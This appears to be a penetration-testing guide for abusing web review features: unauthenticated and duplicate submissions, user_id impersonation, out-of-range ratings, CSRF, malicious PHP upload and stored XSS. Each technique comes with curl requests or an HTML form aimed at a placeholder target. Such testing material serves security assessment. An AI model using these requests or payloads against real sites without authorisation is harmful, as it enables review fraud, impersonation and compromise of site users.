# Review Feature Testing

## Context

The objective of this document is to enable offensive operators to identify and exploit business logic flaws in web application review features. The focus is on techniques such as unauthorized review submission, review manipulation, and abuse of review-related functionality. This article assumes that the reader has knowledge of HTTP methods, session management, CSRF protection, input validation, and the fundamentals of business logic errors.

## Theory

### Review Feature Trust Model

Review features are designed to allow authenticated users to submit feedback or ratings for products or services. These features often rely on certain trust assumptions, such as only eligible users being able to submit reviews and only once per item. The integrity of these reviews is contingent upon proper authentication, authorization, and input validation to prevent abuse.

### Common Review Feature Vulnerabilities

Common vulnerabilities within review features include:

- **Lack of Access Control**: This can allow unauthorized users to submit reviews or enable multiple submissions by the same user for a single product, thereby skewing the rating metrics.
- **Improper Input Validation**: Without stringent validation, attackers can manipulate review scores or embed cross-site scripting (XSS) payloads within reviews.
- **Missing CSRF Protections**: The absence of cross-site request forgery (CSRF) protections can enable attackers to post reviews on behalf of other users without their knowledge.
- **Insufficient File Validation**: This can result in the acceptance and storage of malicious files attached to reviews, leading to potential code execution or other exploits.

### Attacker Mindset: Exploiting Review Logic

To effectively exploit review features, an attacker should:

- Identify endpoints and parameters associated with review submission and editing.
- Test the ability to submit reviews without being authenticated or as another user.
- Attempt to bypass any restrictions imposed on review frequency or rating scales.
- Probe for vulnerabilities related to CSRF in review submission forms.
- Examine file upload fields for weaknesses that allow the upload of malicious files.

## Practice

### Unauthorized Review Submission via Direct Request

Attempting unauthorized review submission can be done using a direct HTTP request. For example:

```bash
curl -X POST https://target.com/review/submit -d 'product_id=123&review=Great!&rating=5'
```

**Expected Outcome**: The ability to submit reviews without a valid user session, effectively bypassing authentication controls.

### Multiple Ratings for Same Product

To test the system's ability to prevent multiple reviews from the same user for a single product:

```bash
curl -b sessionid=abc123 -X POST https://target.com/review/submit -d 'product_id=123&review=Second+Review&rating=4'
```

**Expected Outcome**: The application allows multiple submissions, indicating a flaw in application logic that should prevent such occurrences.

### Review Impersonation via Parameter Tampering

Manipulating the `user_id` parameter to impersonate another user during review submission:

```bash
curl -b sessionid=attacker -X POST https://target.com/review/submit -d 'product_id=123&user_id=victim&review=Fake+Review&rating=1'
```

**Expected Outcome**: The review is recorded as if it was submitted by the `victim`, demonstrating an authentication bypass.

### Review Score Manipulation Beyond Allowed Range

Submit a rating outside the documented scale to test input validation:

```bash
curl -b sessionid=abc123 -X POST https://target.com/review/submit -d 'product_id=123&review=Invalid+Score&rating=999'
```

**Expected Outcome**: The application accepts an out-of-range or invalid review score, revealing weak validation controls.

### CSRF Review Posting

By crafting a CSRF payload, attackers can submit a review on behalf of other users:

```html
<form action='https://target.com/review/submit' method='POST'>
    <input name='product_id' value='123'>
    <input name='review' value='CSRF Review'>
    <input name='rating' value='5'>
    <input type='submit'>
</form>
```

**Expected Outcome**: Reviews are posted without user consent, signifying a CSRF vulnerability.

### Malicious File Upload in Review Attachment

Testing for execution or storage of malicious files via review attachments:

```bash
curl -b sessionid=abc123 -F 'product_id=123' -F 'review=File Test' -F 'rating=5' -F 'attachment=@malicious.php' https://target.com/review/submit
```

**Expected Outcome**: The application accepts the malicious file, indicating a file upload vulnerability.

### Stored XSS via Review Content

Inject a JavaScript payload within the review content to test for XSS:

```bash
curl -b sessionid=abc123 -X POST https://target.com/review/submit -d 'product_id=123&review=<script>alert(1)</script>&rating=5'
```

**Expected Outcome**: Stored XSS is executed when the reviews are viewed, compromising browser security.

## Tools

- **curl**
- **Burp Suite**
- **OWASP ZAP** 

These tools are essential for identifying and exploiting vulnerabilities in review features, offering users powerful capabilities for HTTP requests manipulation, web application scanning, and intercepting requests for further analysis.
